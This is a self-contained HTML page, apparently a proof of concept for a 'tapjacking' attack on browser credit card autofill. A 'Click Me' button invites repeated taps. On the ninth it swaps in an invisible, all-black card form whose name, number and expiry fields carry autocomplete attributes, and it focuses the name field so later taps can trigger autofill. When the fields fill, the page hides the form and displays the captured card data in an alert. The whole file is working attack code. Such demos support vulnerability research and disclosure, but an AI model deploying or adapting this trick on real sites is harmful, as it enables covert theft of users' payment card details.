<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Autofill Tapjack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: white;
            color: black;
            transition: background-color 0.5s ease;
        }

        .button-container, .form-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .click-button {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 10px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
        }

        .form-container {
            display: none; /* Initially hidden */
            padding: 20px;
            border: 2px solid #ccc;
            border-radius: 10px;
            width: 300px;
            background-color: white;
            color: black;
            text-align: left;
            transition: background-color 0.5s ease;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: white;
            color: black;
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        input::placeholder {
            color: #666;
        }

        input:focus {
            border: 1px solid #007bff;
        }

        /* Dark Mode for Tapjacking */
        .dark-mode {
            background-color: black !important;
            color: black !important;
        }

        .dark-mode input {
            background-color: black !important;
            color: black !important;
            border: 1px solid black !important;
        }

        .dark-mode input::placeholder {
            color: black !important;
        }
    </style>
</head>
<body>

    <!-- Button in the center -->
    <div id="buttonContainer" class="button-container">
        <button id="clickButton" class="click-button">Click Me</button>
    </div>

    <!-- Credit Card Form (Initially Hidden) -->
    <div id="formContainer" class="form-container">
        <h2>Credit Card Autofill Test</h2>
        <form id="creditCardForm">
            <label for="cc-name">Cardholder Name:</label>
            <input type="text" id="cc-name" name="Cardholder Name" autocomplete="cc-name" required placeholder="Enter Name">

            <label for="cc-number">Card Number:</label>
            <input type="text" id="cc-number" name="Card Number" autocomplete="cc-number" required placeholder="Enter Card Number">

            <label for="cc-exp">Expiration Date (MM/YY):</label>
            <input type="text" id="cc-exp" name="Expiration Date" autocomplete="cc-exp" required placeholder="MM/YY">
        </form>
    </div>

    <script>
        let clickCount = 0;

        // Button Click Logic
        document.getElementById("clickButton").addEventListener("click", function() {
            clickCount++;
            
            if (clickCount < 8) {
                this.innerText = "Clicked " + clickCount;
            } else if (clickCount === 9) {
                // Apply dark mode
                document.body.classList.add("dark-mode");
                document.getElementById("formContainer").classList.add("dark-mode");
                
                // Hide button and show form
                document.getElementById("buttonContainer").style.display = "none";
                document.getElementById("formContainer").style.display = "block";
                document.getElementById("cc-name").focus();
            } else {
                document.getElementById("cc-name").focus();
            }
        });

        // Input tracking logic
        let formData = { "Cardholder Name": "", "Card Number": "", "Expiration Date": "" };

        document.querySelectorAll("input").forEach(input => {
            input.addEventListener("input", function() {
                formData[this.name] = this.value; // Store the value
                
                // Check if all fields are filled
                if (formData["Cardholder Name"] && formData["Card Number"] && formData["Expiration Date"]) {
                    // Before alerting, restore button and hide form
                    document.getElementById("buttonContainer").style.display = "block"; // Show button
                    document.getElementById("formContainer").style.display = "none"; // Hide form

                    // Reset background
                    document.body.classList.remove("dark-mode");
                    document.getElementById("formContainer").classList.remove("dark-mode");

                    alert(`Cardholder Name: ${formData["Cardholder Name"]}\nCard Number: ${formData["Card Number"]}\nExpiration Date: ${formData["Expiration Date"]}`);
                }
            });
        });
    </script>

</body>
</html>
